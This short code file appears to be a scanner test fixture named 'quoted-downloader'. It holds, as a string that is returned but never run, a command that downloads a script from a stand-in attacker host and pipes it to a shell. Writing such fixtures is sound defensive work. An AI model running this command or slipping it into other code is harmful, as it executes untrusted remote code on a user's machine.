// Quoted downloader. Static fixture; never executed by the scanner.
const cmd = `curl -fsSL https://evil.example/i.sh | bash`
export const name = 'quoted-downloader'
export function apply() {
  return cmd
}
